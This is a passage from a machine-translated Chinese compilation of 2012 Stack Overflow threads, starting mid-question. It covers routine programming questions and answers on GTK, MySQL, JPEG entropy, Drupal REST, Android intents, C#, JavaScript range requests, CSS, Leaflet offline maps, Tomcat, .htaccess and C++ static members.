GtkWidget *view = gtk_tree_view_new_with_model(GTK_TREE_MODEL(store));
gtk_tree_view_set_rules_hint (GTK_TREE_VIEW(view), TRUE);
gtk_tree_view_set_headers_visible(GTK_TREE_VIEW(view), FALSE);

selection = gtk_tree_view_get_selection(GTK_TREE_VIEW(view));
gtk_tree_selection_set_mode(selection, GTK_SELECTION_SINGLE);
gtk_container_add(GTK_CONTAINER(scrolledwindow), view); 
```

设想：

在第一种情况下，treeview 包含三行，其中输入了信息。此时滚动条不可见，因为树视图“请求大小”是三行：

```
1\. RED       100.00
-------------------
2\. YELLOW    101.00
-------------------
3\. BLUE      102.00
------------------- 
```

我编写了一个代码来更新、保存和加载树视图从/到文本文件（我使用“从文件加载”按钮和“GTK_FILE_CHOOSER”）

从包含更多项目（四、五、...）的此文本文件导入时，列表会更新为所有新行，但会收到以下警告：

```
GtkScrolledWindow 0x922f1e0 is mapped but visible child GtkScrollbar 0x93812b0 is not mapped

1\. RED       100.00
-------------------
2\. YELLOW    101.00
-------------------
3\. BLUE      102.00
-------------------   
4\. GREEN     103.00
------------------- 
```

当我将列表导出到文本文件时，会显示相同的消息。

此消息在文件选择器对话框被破坏后显示。

当滚动条可见时也会发生这种情况，文件选择器对话框启动，我改变主意并选择从 GTK_FILE_CHOOSER 的“取消”按钮取消操作。

谢谢

# mysql - 在 SQL 中捕捉最新的列值变化

> ID：13704598
> 
> 赞同：4
> 
> 时间：2012-12-04T13:59:25.133
> 
> 标签：mysql, sql, greatest-n-per-group

如何通过一个 SQL 查询获取一列中最新值更改的日期？

可能的数据库情况：

```
Date        State

2012-11-25  state one
2012-11-26  state one
2012-11-27  state two
2012-11-28  state two
2012-11-29  state one
2012-11-30  state one 
```

所以结果应该返回 2012-11-29 作为最新的更改状态。如果我按状态值分组，我将在数据库中第一次获得该状态的日期。

该查询将按状态对表进行分组，并在日期字段中显示该状态的最新创建日期。

从给定的输入输出将是

```
Date               State

2012-11-30        state one
2012-11-28        state two 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T15:23:11.307

这将为您提供最后一个状态：

```
-- Query 1
SELECT state
FROM tableX 
ORDER BY date DESC
  LIMIT 1 ; 
```

封装以上内容，我们可以使用它来获取上次更改之前的日期：

```
-- Query 2
SELECT t.date
FROM tableX AS t
  JOIN
    ( SELECT state
      FROM tableX 
      ORDER BY date DESC
        LIMIT 1
    ) AS last
    ON last.state <> t.state
ORDER BY t.date DESC
    LIMIT 1 ; 
```

然后使用它来查找最后一次更改发生的日期（或整行）：

```
-- Query 3
SELECT a.date                         -- can also be used:   a.*
FROM tableX AS a 
  JOIN
    ( SELECT t.date
      FROM tableX AS t
        JOIN
          ( SELECT state
            FROM tableX 
            ORDER BY date DESC
              LIMIT 1
          ) AS last
          ON last.state <> t.state
      ORDER BY t.date DESC
          LIMIT 1
    ) AS b
    ON a.date > b.date
ORDER BY a.date
  LIMIT 1 ; 
```

在**[SQL-Fiddle中测试](http://sqlfiddle.com/#!2/e7b8d/11)**

* * *

还有一个使用 MySQL 变量的解决方案：

```
-- Query 4
SELECT date
FROM
  ( SELECT t.date
         , @r := (@s <> state) AS result 
         , @s := state AS prev_state
    FROM tableX AS t
      CROSS JOIN
        ( SELECT @r := 0, @s := '' 
        ) AS dummy 
    ORDER BY t.date ASC 
  ) AS tmp
WHERE result = 1
ORDER BY date DESC
  LIMIT 1 ; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T14:39:31.717

如果您一直在使用 postgres，则可以使用“LEAD .. OVER”比较同一个表中的不同行。我还没有设法在 mysql 中找到相同的功能。

有点毛茸茸，但我认为这会做：

```
select min(t1.date) from table_1 t1 where 
  (select count(distinct state) from table_1 where table_1.date>=t1.date)=1 
```

基本上，这是第一次要求没有为任何后来的值找到状态变化。请注意，对于大型数据集，此查询可能会严重扩展......

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T14:04:52.390

如果您添加另一列“更改日期时间”，则可以使用插入 NOW() 的更新触发器来填充此列。如果您在更改的列上查询表排序，它将首先结束。

```
CREATE TRIGGER `trigger` BEFORE UPDATE ON `table` 
FOR EACH ROW
BEGIN
SET ROW.changed = NOW();
END$$ 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-04T14:07:55.230

尝试这个 ：：

```
Select 
    MAX(`Date`), state from mytable 

    group by state 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-04T14:15:04.800

我相信这是答案：

```
SELECT 
    DISTINCT State AS State, `Date`
FROM 
    Table_1 t1
WHERE t1.`Date`=(SELECT MAX(`Date`) FROM Table_1 WHERE State=t1.State) 
```

...和测试：

[http://sqlfiddle.com/#!2/8b0d8/5](http://sqlfiddle.com/#!2/8b0d8/5)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-01-31T19:31:30.853

我认为您最好的选择是分析功能。试试这个 - 性能方面应该没问题：

```
SELECT *
FROM test
WHERE my_date = (SELECT MAX (my_date)
                FROM (SELECT MY_DATE
                        FROM (  SELECT MY_DATE,
                                       STATE,
                                       LAG (state) OVER (ORDER BY MY_DATE)
                                          lag_val
                                  FROM test
                              ORDER BY MY_DATE) a
                       WHERE state != lag_val)) 
```

在内部选择中，LAG 函数在 STATE 列中获取先前的值，在外部选择中，我标记了更改的日期 - 滞后值与当前状态值不同的那些。在外面，我正在从这些更改日期中获取最新日期......我希望这是你所需要的。

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2012-12-04T14:04:33.027

```
SELECT MAX(DATE) FROM YOUR_TABLE 
```

上面的答案似乎不能满足 OP 的需求。

**插入/更新触发器后更新的答案**

```
DELCARE @latestState varchar;
DELCARE @latestDate date;
CREATE TRIGGER latestInsertTrigger AFTER INSERT ON myTable
FOR EACH ROW
BEGIN
    IF OLD.DATE <> NEW.date THEN 
      SET @latestState = NEW.state 
      SET @latestDate = NEW.date
    END IF
END
;

CREATE TRIGGER latestUpdateTrigger AFTER UPDATE ON myTable
FOR EACH ROW
BEGIN 
    IF OLD.DATE = NEW.date AND OLD.STATE <> NEW.STATE THEN 
      SET @latestState = NEW.state 
      SET @latestDate = NEW.date
    END IF
END
; 
```

您可以使用以下查询来获取添加/更新的最新记录：

```
SELECT DATE, STATE FROM myTable
WHERE STATE = @latestState
OR DATE = @latestDate 
ORDER BY DATE DESC
; 
```

结果：

```
DATE                                STATE
November, 30 2012 00:00:00+0000     state one
November, 28 2012 00:00:00+0000     state two
November, 27 2012 00:00:00+0000     state two 
```

上述查询结果需要根据您的需要限制为 2、3 或 n。

坦率地说，您似乎想根据您提供的数据样本从两列中获取最大值。假设您的状态仅随日期增加。只有我希望如果`state`是`integer`:D 那么两个列上的两个最大子查询的联合将很容易解决它。字符串操作正则表达式仍然可以找到状态列中的最大值。最后这种方法需要`limit x`。然而它仍然**有漏孔**。*无论如何，我花了一些时间来弄清楚你的需要*：$

# statistics - jpeg 文件中的字节分布

> ID：13704600
> 
> 赞同：4
> 
> 时间：2012-12-04T13:59:36.303
> 
> 标签：statistics, compression, distribution, jpeg, chi-squared

在观察压缩数据时，我期望一个几乎均匀分布的字节流。当使用卡方检验来测量分布时，我得到了这个结果，例如 ZIP 文件和其他压缩数据，但不是 JPG 文件。最近几天我一直在寻找原因，但我找不到任何原因。

在计算 JPG 的熵时，我得到了一个很高的结果（例如 7,95 位/字节）。我认为熵和分布之间一定存在联系：熵很高，当每个字节出现的概率几乎相同时。但是当使用卡方时，a 得到的 p 值约为 4,5e-5...

我只是想了解不同的分布如何影响测试结果......我以为我可以用两个测试来测量相同的属性，但显然我不能。

非常感谢您的任何提示！汤姆

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T19:24:32.267

## 在 jpeg 文件中分发

忽略元信息和 jpeg-header-data，jpeg 的*有效负载*由描述[哈夫曼表](http://en.wikipedia.org/wiki/Huffman_coding)或编码 MCU 的块组成（最小编码单元，大小为 16x16 的方形块）。可能还有其他的，但这是最常见的。

这些块由 分隔`0xFF 0xSS`，其中`0xSS`是特定的起始码。这是第一个问题：正如评论中提到的[twalberg](https://stackoverflow.com/users/1253222/twalberg)`0xFF`一样，它更频繁一些。

它可能发生`0xFF`在编码的 MCU 中。为了区分这个*正常*的有效载荷和新块的开始，`0xFF 0x00`插入。如果未填充的有效载荷的分布完全均匀，`0x00`则填充数据中的频率将增加一倍。更糟糕的是，每个 MCU 都充满了二进制文件以实现字节对齐（稍微偏向较大的值），我们可能需要再次填充。

可能还有其他一些我不知道的因素。如果您需要更多信息，您必须提供 jpeg 文件。

## 关于你的基本假设：

对于 rand_data：

```
 dd if=/dev/urandom of=rand_data count=4096 bs=256 
```

对于 rand_pseudo (python)：

```
s = "".join(chr(i) for i in range(256))
with file("rand_pseudo", "wb") as f:
    for i in range(4096):
        f.write(s) 
```

两者在字节值方面都应该是统一的，不是吗？;)

```
$ ll rand_*
-rw-r--r-- 1 apuch apuch 1048576 2012-12-04 20:11 rand_data
-rw-r--r-- 1 apuch apuch 1048967 2012-12-04 20:13 rand_data.tar.gz
-rw-r--r-- 1 apuch apuch 1048576 2012-12-04 20:14 rand_pseudo
-rw-r--r-- 1 apuch apuch    4538 2012-12-04 20:15 rand_pseudo.tar.gz 
```

均匀分布可能表示高[熵](http://en.wikipedia.org/wiki/Entropy_%28information_theory%29)，但不能保证。此外，rand_data 可能包含 1MB 的`0x00`. 它极不可能，但有可能。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-09T08:59:55.033

这是我的java代码

```
 public static double getShannonEntropy_Image(BufferedImage actualImage){
         List<String> values= new ArrayList<String>();
           int n = 0;
           Map<Integer, Integer> occ = new HashMap<>();
           for(int i=0;i<actualImage.getHeight();i++){
             for(int j=0;j<actualImage.getWidth();j++){
               int pixel = actualImage.getRGB(j, i);
               int alpha = (pixel >> 24) & 0xff;
               int red = (pixel >> 16) & 0xff;
               int green = (pixel >> 8) & 0xff;
               int blue = (pixel) & 0xff;
//0.2989 * R + 0.5870 * G + 0.1140 * B greyscale conversion
//System.out.println("i="+i+" j="+j+" argb: " + alpha + ", " + red + ", " + green + ", " + blue);
                int d= (int)Math.round(0.2989 * red + 0.5870 * green + 0.1140 * blue);
               if(!values.contains(String.valueOf(d)))
                   values.add(String.valueOf(d));
               if (occ.containsKey(d)) {
                   occ.put(d, occ.get(d) + 1);
              } else {
                  occ.put(d, 1);
              }
              ++n;
       }
    }
    double e = 0.0;
    for (Map.Entry<Integer, Integer> entry : occ.entrySet()) {
         int cx = entry.getKey();
         double p = (double) entry.getValue() / n;
         e += p * log2(p);
    }
 return -e;
  } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-05T17:02:21.770

在这里你可以找到两个文件：第一个是随机数据，用 dev/unrandom 生成（大约 46MB），第二个是普通的 JPG 文件（大约 9MB）。很明显，JPG 文件的符号不像 dev/urandom 那样均匀分布。

如果我比较两个文件：

熵：JPG：7,969247 位/字节 RND：7,999996 位/字节

卡方检验的 P 值：JPG：0 RND：0,3621

熵怎么会导致这么高的结果？！？

![随机数据（dev/urandom](../Images/ce636a95aa16956018b060201d833b0b.png) ![JPG](../Images/3120759611384fae84c876811ad4bfdc.png)

# php - 如何使用 REST 服务器 PHP CURL 在 drupal 7 中创建带有图像的节点？

> ID：13704602
> 
> 赞同：0
> 
> 时间：2012-12-04T13:59:35.757
> 
> 标签：php, drupal, curl

我正在尝试使用**drupal 7 REST 服务器**创建一个带有图像的节点，我已经正确配置了 REST 服务器，我能够创建以简单文本为主体的节点，我也希望能够发布图像，即我应该能够显示新创建的节点中的图像或至少应该能够将图像附加到节点主体？到目前为止，我正在这样做，如何在节点的正文中附加/显示图像？我正在通过外部 PHP 脚本执行此操作

```
 $node_data = array(
  'title' => "this is test node",
  'type' => 'blog',
  'body[und][0][value]' => 'this is test node description'
);

$node_data = http_build_query($node_data);
$cookie_session = $logged_user->session_name . '=' . $logged_user->sessid;

// cURL
$curl = curl_init($request_url);
curl_setopt($curl, CURLOPT_HTTPHEADER, array('Accept: application/json')); // Accept JSON response
curl_setopt($curl, CURLOPT_POST, 1); // Do a regular HTTP POST
curl_setopt($curl, CURLOPT_POSTFIELDS, $node_data); // Set POST data
curl_setopt($curl, CURLOPT_HEADER, FALSE);  // Ask to not return Header
curl_setopt($curl, CURLOPT_COOKIE, "$cookie_session"); // use the previously saved session
curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);
curl_setopt($curl, CURLOPT_FAILONERROR, TRUE);

$response = curl_exec($curl);
$http_code = curl_getinfo($curl, CURLINFO_HTTP_CODE); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T16:07:22.997

好的，我可以将图像发布到新创建的 drupal 节点。我设法通过将节点主体指定为“full_html”来做到这一点。在 node_data 数组中添加了以下参数

```
'body[und][0][format]' =>'full_html' 
```

有了这个，我可以将内容发布为 html 内容，因此可以将图像嵌入其中。

顺便说一句，有三个选项可用：

```
filtered_html
full_html
plain_text 
```

# android - 从短信中的链接启动 android 应用程序

> ID：13704604
> 
> 赞同：5
> 
> 时间：2012-12-04T13:59:46.553
> 
> 标签：android, xml

我已经阅读了所有其他关于这样做的帖子，但没有一个能解决我的问题。显然，该方案必须是 http 的链接，否则它在短信中不可点击。

如果我使用其他人发布的内容并单击我提供的 http 链接：

打开网址，添加到书签，复制消息文本

如果我打开 URL，我只能选择浏览器，没有别的。

我需要它来打开应用程序，而不是提供浏览器选项。

请帮忙。

XML:

```
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
package="com.example.testapp"
android:versionCode="1"
android:versionName="1.0" >

<uses-sdk
    android:minSdkVersion="8"
    android:targetSdkVersion="15" />

<application
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name"
    android:theme="@style/AppTheme" >
    <activity
        android:name=".MainActivity"
        android:label="@string/title_activity_main" >
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />

            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>

        <intent-filter>    
            <action android:name="android.intent.action.VIEW" />    
            <category android:name="android.intent.catagory.DEFAULT"/> 
            <category android:name="android.intent.catagory.BROWSABLE"/>    
            <data android:scheme="http" android:host="starttestapp.com"/>
        </intent-filter>
    </activity>
</application> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-17T19:31:51.830

If you copy pasted your code, then you have a spelling error:

catagory should be category like this:

```
<category android:name="android.intent.category.DEFAULT"/>
<category android:name="android.intent.category.BROWSABLE"/> 
```

# c# - 为类的不同实例分配不同的数据类型？

> ID：13704607
> 
> 赞同：1
> 
> 时间：2012-12-04T13:59:52.810
> 
> 标签：c#

采取以下样本：

![在此处输入图像描述](../Images/79a3a7c835189c5c612285f324ba6e9b.png)

我想添加一个属性来`PreferenceOption`调用`DataType`，因为不同的实例`PreferenceOption`可能是`bool`等`string`。

有没有办法做到这一点？如果是，如何？

我在想类似的东西`public ValueType DataType { get; set; }`，但是在创建`PreferenceOption`类似的实例时：

```
PreferenceOption WantsHouse = new PreferenceOption () { PreferenceOption = "Want House?", Weighting = Weighting.Low, Type = bool }; 
```

这不起作用，但应该很好地了解我想要做什么。

有什么建议么？

编辑（答案）：使用下面选择的答案，这就是我现在正在使用的（为模糊的图像道歉！）：

```
public enum Weighting { One, Two, Three, Four, Five, Six, Seven, Eight, Nine, Ten }

public class TenantPropertyPreferenceOption<T>
{
    public T PreferenceOption { get; set; }
    public Weighting Weighting { get; set; }
}

public class TenantPropertyPreferenceOptions
{
    TenantPropertyPreferenceOption<bool> WantsHouse = new TenantPropertyPreferenceOption<bool> () { PreferenceOption = false, Weighting = Weighting.One };
    // ...
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T14:02:20.980

使用泛型类；

```
public class PreferenceOption<T>
{
    public T PreferenceOption {get;set;}
    public string PreferenceOptionName {get;set;}
}

PreferenceOption WantsHouse = new PreferenceOption<bool> () { PreferenceOption = true, Weighting = Weighting.Low, PreferenceOptionName ="asd"};

PreferenceOption WantsHouse2 = new PreferenceOption<string> () { PreferenceOption = "this is a string", Weighting = Weighting.Low, PreferenceOptionName="qwe"}; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T14:02:33.710

使用[类型](http://msdn.microsoft.com/en-us/library/system.type.aspx)

```
public Type DataType { get; set; }

DataType = typeof(bool) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-04T14:03:00.177

您可以将类[设为 Generic](http://msdn.microsoft.com/en-us/library/512aeb7t.aspx)。

```
PreferenceOption<bool> WantsHouse;
PreferenceOption<string> HouseName; 
```

# javascript - 使用 Javascript 部分下载文件

> ID：13704615
> 
> 赞同：6
> 
> 时间：2012-12-04T14:00:21.703
> 
> 标签：javascript, html, web-applications, id3

我们实际上正在使用 javascript 开发远程音乐库管理器，我想知道是否有一种方法可以使用 js 下载 MP3 文件的最后 128 字节以获得其 ID3 标签。谢谢。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-12-04T14:07:09.220

仅使用 JavaScript 无法做到这一点。您需要服务器上的某些东西（这完全取决于您的服务器端技术）来读取文件的相关部分。然后在 JavaScript 中，您可以调用该服务器端部分。

## 更新 1

HTTP 协议支持部分下载文件（就是这样）。但当然 HTTP 对 MP3 文件一无所知，因此您必须知道文件的哪个范围包含 JavaScript 中的 ID3 标记。

## 更新 2

用纯 JavaScript 下载 URL 的一部分似乎比我最初预期的更可行：

```
xhr = new XMLHttpRequest();
xhr.open("GET", "http://<your domain>/");
xhr.setRequestHeader("Range", "bytes=-256");
xhr.send(); 
```

这会请求远程文件的最后 256 个字节。

请注意，您的请求当然会受到通常的同源限制，因此您只能使用它从包含原始 HTML/JavaScript 的服务器中检索文件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T14:09:10.303

不使用服务器端编程语言：不。

您可以使用 Ajax 和 PHP（或任何其他编程语言）来获取 ID3 标记。

使用 jQuery，它看起来像这样：

```
function getInfo(func) {
$.ajax({
    url: "mp3info.php?file=" + url,
    dataType: "json",
    ready: function(result) {
        func(result);
    }
});
} 
```

你像这样使用它：

```
getInfo(function(mp3info) {
    alert(mp3info.id3);
}); 
```

然后你的 PHP 文件看起来像这样：

```
<?php
$info = array(); //The MP3 info array
echo json_encode($info, true);
?> 
```

# css - div 突出显示不会转换为 div 的新位置

> ID：13704618
> 
> 赞同：0
> 
> 时间：2012-12-04T14:00:26.833
> 
> 标签：css, ruby-on-rails-3, jquery-ui

我正在使用`ui-state-highlight`on突出显示一个 div 并在鼠标事件`mouseover`上缩进它。`click`div 未缩进时完美突出显示，但缩进后突出显示仍根据 div 的先前位置。突出显示/缩进的 div 是一个可排序元素。我知道这可能与 CSS 有关，但我是个菜鸟！

代码;

```
<style>
      .ui-state-highlight {border: 4px solid #ffffa1;}
      .indent { margin: 0; padding-left: 10px; }
</style> 
```

鼠标点击；

```
if ($('#'+(parseInt(pushpin._text))).prop('class') == "indent ui-state-highlight" || $('#'+(parseInt(pushpin._text))).prop('class') == "ui-state-highlight indent"){  
    $('#'+(parseInt(pushpin._text))).removeClass("indent"); 
}
else{
    $('#'+(parseInt(pushpin._text))).addClass("indent");
} 
```

鼠标悬停时

```
$('#'+(parseInt(pushpin._text))).addClass("ui-state-highlight") 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T14:16:13.330

尝试使用`margin-left`而不是`padding-left`.

内边距是内容和元素边框之间的空间。您想要的是将元素“移动”到右侧。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T14:14:34.197

### 只需将 CSS 更改为：

```
.ui-state-highlight, .ui-state-highlight.indent {border: 4px solid #ffffa1;}
.indent { margin: 0; padding-left: 10px; } 
```

应该是特异性问题。

# c# - 使用 ASP.Net 检查客户端上安装的应用程序

> ID：13704620
> 
> 赞同：0
> 
> 时间：2012-12-04T14:00:33.773
> 
> 标签：c#, javascript, asp.net, activex

任何人都可以建议如何检查应用程序是否安装在 ASP.Net 应用程序的客户端上。

由于 asp.net 在服务器上运行，我相信应该使用一些客户端脚本来完成。

有什么建议吗？

谢谢，纳雷什

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T14:04:57.943

这只有在您可以在您的页面上运行 ActiveX 组件时才有可能——最终用户必须在他的机器上安装该组件，以授予其读取注册表的权限。

JavaScript 本身（或 VBScript）无法从注册表中读取值，也无法访问客户端 PC 的文件系统，因此无法找出安装的内容。

# web-applications - 将 .osm 转换为 .map 后，Web 应用程序中的离线地理地图

> ID：13704632
> 
> 赞同：1
> 
> 时间：2012-12-04T14:01:10.127
> 
> 标签：web-applications, maps, offline, openstreetmap, gis

我对在我的 Web 应用程序中提供离线地图有这个非常基本的要求。我的网络应用程序无法访问互联网，因此所有用于显示地图的在线 API 都被完全排除在外。

经过研究，我下载了所需位置（比如特定城市）的 .osm.pbf 格式文件。我

> 将 .osm.pbf 转换为 .osm 文件

下一步我使用这个 .osm 文件生成了切片。

> 瓷砖存储在我的本地目录中。
> 
> 我的最后一步是在我的应用程序 (Java EE) 内的网络浏览器中将这些图块显示为地图，并根据一个地方的纬度和经度放置一个标记。

这是我必须在离线地图中显示的唯一要求。

我有一个特定城市的图块。但我不知道如何使用它并显示离线地图..

> 我所说的离线是指应用程序托管在应用程序服务器上的 Intranet 上，并且在任何情况下都不提供 Internet 访问。

请指导。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-05T09:55:28.613

首先，您需要一个可以下载并驻留在应用程序中的映射库。有几种，但最常见的是[Leaflet](http://leafletjs.com/)和[OpenLayers](http://openlayers.org/)。两者都支持自定义切片图层。

例如，假设您的切片位于 Web 应用程序中名为“tiles”的文件夹中，则可能的层定义将是（在 Leaflet 中）：

```
var map = L.map('map');
L.tileLayer('tiles/{z}/{x}/{y}.png').addTo(map); 
```

甚至在内网的其他机器上

```
var map = L.map('map');
L.tileLayer('http://intranetmachine/tiles/{z}/{x}/{y}.png').addTo(map); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-01-12T05:45:07.347

您快到了。

在本地保存传单 .js 和 .css 文件。

*   [http://leafletjs.com/dist/leaflet.css](http://leafletjs.com/dist/leaflet.css)
*   [http://leafletjs.com/dist/leaflet.js](http://leafletjs.com/dist/leaflet.js)

查看这个基本示例的源代码：http: [//leafletjs.com/examples/quick-start-example.html](http://leafletjs.com/examples/quick-start-example.html)

将 .css、.js 路径更改为本地副本，并将 tileLayer 路径更改为本地，如所述。

查看标记的代码：

```
L.marker([51.5, -0.09]).addTo(map)
            .bindPopup("<b>Hello world!</b><br />I am a popup.").openPopup(); 
```

我猜这就是你需要的。如有必要，删除其他多边形和 click-show-lat-long 功能。

如果您希望地图全屏显示，请将`<div..`标签更改为 100%。

```
<div id="map" style="width: 100%; height: 100%"></div> 
```

# java - 使用 context.xml 配置 WebApp 以使用 Tomcat

> ID：13704634
> 
> 赞同：0
> 
> 时间：2012-12-04T14:01:13.107
> 
> 标签：java, tomcat, maven, web-applications

我正在使用 Maven 3 来构建我的项目。我有一个要定义自定义根的 Web 应用程序。根据 Tomcat 6 文档，它说：

```
The locations for Context Descriptors are: 
1\.  $CATALINA_BASE/conf/[enginename]/[hostname]/context.xml 
2\.  $CATALINA_BASE/webapps/[webappname]/META-INF/context.xml

Files in (1) are named [webappname].xml but files in (2) are named context.xml. 
If a Context Descriptor is not provided for a Context, Tomcat configures the Context using default values. 
```

我想使用我定义的自定义根。这是如何实现的，因为当我定义自定义 context.xml 文件时，在 Tomcat 中看不到路径。根据上面，它提到如果没有为 Context 提供 Context Descriptor，则 Tomcat 使用默认值配置 Context。我已经在 context.xml 中定义了我的上下文描述符，如下所示：

```
<?xml version="1.0" encoding="UTF-8"?>
<Context path="/data1"/> 
```

当我将 deploy.war 部署到 Tomcat 时，我无法访问 /data1 不起作用。但是， /data 有效。部署 war 文件时，它具有带有 context.xml 的 META-INF。

我的 POM 文件：

```
<?xml version="1.0"?>
<project xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd" xmlns="http://maven.apache.org/POM/4.0.0"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<modelVersion>4.0.0</modelVersion>
 <groupId>com.data</groupId>
 <artifactId>Java-WebApp</artifactId>
 <version>0.0.1-SNAPSHOT</version>
 <packaging>war</packaging>

<name>Java-Web Application</name>

<!-- Shared version number properties-->
<properties>
<org.springframework.version>3.0.6.RELEASE</org.springframework.version>
</properties>

<dependencies>
   <dependency>
      <groupId>junit</groupId>
      <artifactId>junit</artifactId>
      <version>3.8.1</version>
      <scope>test</scope>
    </dependency>
</dependencies>
<build>
<plugins>
    <plugin>
        <groupId>org.apache.maven.plugins</groupId>
        <artifactId>maven-war-plugin</artifactId>
        <version>2.0</version>
        <configuration>
            <webResources>
                <resource>
                    <directory>${project.basedir}/src/main/resources</directory>
                </resource>
            </webResources>
        </configuration>
    </plugin>
</plugins>
<finalName>data</finalName>
</build>

<parent>
<groupId>com.data</groupId>
<artifactId>Java-Parent</artifactId>
<version>0.0.1-SNAPSHOT</version>
</parent>
</project> 
```

我查看了以下网站，但似乎没有帮助：

[在 WAR 文件中定义 Servlet 上下文](https://stackoverflow.com/questions/2593472/define-servlet-context-in-war-file)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T14:15:04.473

查看你的 pom，war 文件的名称应该是“webchannel”。

您不必添加 context.xml。只需让 url 由 war 文件名以及您在项目中创建的任何映射确定。

# javascript - window.PARAM vs window.parent.PARAM vs window.top.PARAM？

> ID：13704635
> 
> 赞同：0
> 
> 时间：2012-12-04T14:01:19.477
> 
> 标签：javascript

我需要从几个 js 文件中访问一个`SETTINGS`在不同 js 文件中定义的全局常量。研究此事，我遇到了以下所有替代方案：

*   `window.SETTINGS`
*   `window.parent.SETTINGS`
*   `window.top.SETTINGS`

这些替代方案之间有什么区别（如果有的话）？他们中的任何一个被认为是“最佳实践”吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T14:04:18.763

当当前上下文是顶帧时[`window`](https://developer.mozilla.org/en-US/docs/DOM/window)，[`top`](https://developer.mozilla.org/en-US/docs/DOM/window.top)和[`parent`](https://developer.mozilla.org/en-US/docs/DOM/window.parent)是相同的。

否则，`window`指的是当前上下文、`parent`父框架和`top`顶部框架。

外部脚本在与嵌入它们的文档相同的上下文中运行。所以，使用`window.SETTINGS`.

# .htaccess - 仅重定向某些路径

> ID：13704640
> 
> 赞同：0
> 
> 时间：2012-12-04T14:01:28.860
> 
> 标签：.htaccess

我只需要重定向一些页面以使 URL 更整洁，例如：

原文：[http ://www.mywebsite.com/form.php](http://www.mywebsite.com/form.php)

我想要什么：[http](http://www.mywebsite.com/form) ://www.mywebsite.com/form和[http://www.mywebsite.com/form/](http://www.mywebsite.com/form/)

我该如何为此编写 htaccess 文件？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T16:05:41.277

我没有测试过，但这样的东西应该可以工作：

```
RewriteEngine On
RewriteRule ^form.php(/)?$  http://www.mywebsite.com/form$1 [L] 
```

# html - 如何将 css 图像库放置在背景图像之上

> ID：13704641
> 
> 赞同：0
> 
> 时间：2012-12-04T14:01:28.680
> 
> 标签：html, css, gallery, background-image

我是 HTML、CSS 和 co 的新手。目前我正在创建一个网站，我想在其中创建一个小图片库，其中包含两行 (3 + 3) 的 6 张图片。下面有一个背景图像。

我按照 W3 School [CSS Image Gallery](http://www.w3schools.com/css/css_image_gallery.asp)上的说明进行操作，但图像彼此叠放而不是内联。

你有什么解决办法吗？

*不幸的是，我不能在这里发布任何屏幕截图或代码，因为这是我的第一篇文章，我没有足够的声誉。*

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T14:35:28.857

W3 代码中内联图像的相关代码是 CSS：`float:left`

如果您的所有图像都在同一个容器中（或`div`例如），那么您需要使用`clear:left`. 见这个例子：http: [//jsfiddle.net/vJjgg/](http://jsfiddle.net/vJjgg/)

否则，只有两个 div 里面有`float:left`这样的图像：http: [//jsfiddle.net/ug8Zt/](http://jsfiddle.net/ug8Zt/)

# c++ - 静态数据成员

> ID：13704644
> 
> 赞同：-2
> 
> 时间：2012-12-04T14:01:33.417
> 
> 标签：c++, visual-studio-2010

请看下面的代码

**游戏对象.h**

```
#pragma once
class GameObject
{
public: 
    GameObject(int);
    ~GameObject(void);

    int id;

private:
    GameObject(void);

}; 
```

**游戏对象.cpp**

```
#include "GameObject.h"
#include <iostream>

using namespace std;

static int counter = 0;

GameObject::GameObject(void)
{
}

GameObject::GameObject(int i)
{
    counter++;
    id = i;
}

GameObject::~GameObject(void)
{
} 
```

**主文件**

```
#include <iostream>
#include "GameObject.h"

using namespace std;

int main()
{
    //GameObject obj1;
    //cout << obj1.id << endl;

    GameObject obj2(45);
    cout << obj2.id << endl;;
//  cout << obj2.counter << endl;

    GameObject obj3(45);
    GameObject obj4(45);
    GameObject obj5(45);

    //Cannot get Static value here
    //cout << "Number of Objects: " << GameObject
    //

    system("pause");
    return 0;
} 
```

在这里，我试图记录已经创建了多少个实例。我知道它可以由静态数据成员完成，但我无法使用 Main 方法访问它！请帮忙！

PS：

我正在寻求直接访问，没有 getter 方法

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T14:09:47.307

您的静态变量`counter`无法访问，因为它不是`GameObject`. 如果要访问`counter`，则需要执行以下操作：

**游戏对象.h**

```
#pragma once

class GameObject
{
public: 
    ...
    static int GetCounter();
    ...
}; 
```

**游戏对象.cpp**

```
int GameObject::GetCounter()
{
    return counter;
} 
```

然后你可以像这样访问变量：

```
cout << "Number of Objects: " << GameObject::GetCounter(); 
```

